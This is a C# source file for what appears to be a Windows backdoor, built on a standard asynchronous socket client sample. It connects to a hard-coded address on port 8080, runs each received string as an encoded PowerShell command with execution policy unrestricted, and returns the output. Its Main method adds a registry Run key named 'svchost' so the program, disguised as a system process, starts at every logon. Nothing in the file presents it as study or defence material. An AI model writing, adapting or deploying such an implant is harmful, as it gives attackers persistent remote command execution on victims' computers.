using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;

// State object for receiving data from remote device.  
public class StateObject
{
    // Client socket.  
    public Socket workSocket = null;
    // Size of receive buffer.  
    public const int BufferSize = 256;
    // Receive buffer.  
    public byte[] buffer = new byte[BufferSize];
    // Received data string.  
    public StringBuilder sb = new StringBuilder();
}

public class AsynchronousClient
{
    private static ManualResetEvent connectDone =
        new ManualResetEvent(false);
    private static ManualResetEvent sendDone =
        new ManualResetEvent(false);
    private static ManualResetEvent receiveDone =
        new ManualResetEvent(false);

    private static Socket client;


    // The response from the remote device.  
    private static String response = String.Empty;
    private static String result = String.Empty;
    private static Process process = new Process();

    private static void StartClient()
    {
        process.EnableRaisingEvents = true;
        process.OutputDataReceived += new DataReceivedEventHandler(process_OutputDataReceived);
        process.ErrorDataReceived += new DataReceivedEventHandler(process_ErrorDataReceived);
        process.Exited += new EventHandler(process_Exited);
        try
        {
            IPAddress ipAddress = IPAddress.Parse("10.14.59.49");
            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 8080);
            client = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            client.BeginConnect(remoteEP,
                new AsyncCallback(ConnectCallback), client);
            connectDone.WaitOne();

            while (true) { 
                Receive(client);
                receiveDone.WaitOne();
                Console.WriteLine(response);
                var psCommandBytes = Encoding.Unicode.GetBytes(response);
                var psCommandBase64 = Convert.ToBase64String(psCommandBytes);
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-NoProfile -ExecutionPolicy unrestricted -EncodedCommand " + psCommandBase64;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                try
                {
                    process.BeginErrorReadLine();
                    process.BeginOutputReadLine();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
                process.WaitForExit();
                Send(result);
                process.CancelOutputRead();
                process.CancelErrorRead();
                receiveDone.Reset();
                result = "";
            }
            client.Shutdown(SocketShutdown.Both);
            client.Close();

        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
        }
    }

    private static void ConnectCallback(IAsyncResult ar)
    {
        try
        {
            // Retrieve the socket from the state object.  
            Socket client = (Socket)ar.AsyncState;

            // Complete the connection.  
            client.EndConnect(ar);

            Console.WriteLine("Socket connected to {0}",
                client.RemoteEndPoint.ToString());

            // Signal that the connection has been made.  
            connectDone.Set();
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
        }
    }

    private static void Receive(Socket client)
    {
        try
        {
            // Create the state object.  
            StateObject state = new StateObject();
            state.workSocket = client;
            Console.WriteLine("Should Receive");
            // Begin receiving the data from the remote device.  
            client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                new AsyncCallback(ReceiveCallback), state);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
        }
    }

    private static void ReceiveCallback(IAsyncResult ar)
    {
        try
        {
            StateObject state = (StateObject)ar.AsyncState;
            Socket client = state.workSocket;
            int bytesRead = client.EndReceive(ar);
            Console.WriteLine(bytesRead);
            state.sb.Append(Encoding.ASCII.GetString(state.buffer, 8, bytesRead - 8));
            response = state.sb.ToString();
            receiveDone.Set();
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
        }
    }

    private static void Send(String data)
    {
        // Convert the string data to byte data using ASCII encoding.  
        byte[] byteData = Encoding.ASCII.GetBytes(data);
        // Begin sending the data to the remote device.  

        byte[] intBytes = BitConverter.GetBytes(byteData.Length);
        byte[] result = intBytes;
        byte[] output = new byte[result.Length + byteData.Length];
        for (int i = 0; i < result.Length; i++)
            output[i] = result[i];
        for (int j = 0; j < byteData.Length; j++)
            output[result.Length + j] = byteData[j];

        client.BeginSend(output, 0, output.Length, 0,
            new AsyncCallback(SendCallback), client);
    }

    private static void SendCallback(IAsyncResult ar)
    {
        try
        {
            // Retrieve the socket from the state object.  
            Socket client = (Socket)ar.AsyncState;

            // Complete sending the data to the remote device.  
            int bytesSent = client.EndSend(ar);
            Console.WriteLine("Sent {0} bytes to server.", bytesSent);

            // Signal that all bytes have been sent.  
            sendDone.Set();
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
        }
    }

    private static void process_Exited(object sender, EventArgs e)
    {
        Console.WriteLine(string.Format("process exited with code {0}\n", process.ExitCode.ToString()));
    }

    private static void process_ErrorDataReceived(object sender, DataReceivedEventArgs e)
    {
        Console.WriteLine(e.Data + "\n");
    }

    private static void process_OutputDataReceived(object sender, DataReceivedEventArgs e)
    {
        Console.WriteLine(e.Data + "\n");
        result += e.Data + "\n";
    }

    public static int Main(String[] args)
    {
        String path =  Environment.CurrentDirectory + "\\svchost.exe";
        RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        key.SetValue("svchost", path, RegistryValueKind.String);
        StartClient();
        return 0;
    }
}